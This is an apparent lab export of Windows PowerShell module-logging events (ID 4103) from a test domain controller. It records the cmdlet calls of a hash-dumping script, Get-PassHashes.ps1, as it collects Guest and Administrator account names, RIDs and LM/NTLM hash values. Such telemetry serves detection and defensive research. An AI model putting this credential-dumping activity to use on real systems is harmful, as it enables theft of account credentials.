        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 124
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.585691900Z" />
    <EventRecordID>14243</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-eb3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 124
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 122
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.584691300Z" />
    <EventRecordID>14242</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e83a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 122
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 120
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.584250500Z" />
    <EventRecordID>14241</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e73a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 120
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="501"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 118
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.584039200Z" />
    <EventRecordID>14240</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e63a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 118
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="501"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Guest"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 116
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.583798300Z" />
    <EventRecordID>14239</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e53a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 116
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Guest"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 114
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.583181700Z" />
    <EventRecordID>14238</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e33a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 114
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 112
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.579744100Z" />
    <EventRecordID>14237</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-743b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 112
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 110
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.579535100Z" />
    <EventRecordID>14236</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-733b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 110
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="500"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 108
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.575303000Z" />
    <EventRecordID>14235</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e03a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 108
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="500"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Administrator"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 106
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.574991400Z" />
    <EventRecordID>14234</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-df3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 106
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Administrator"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
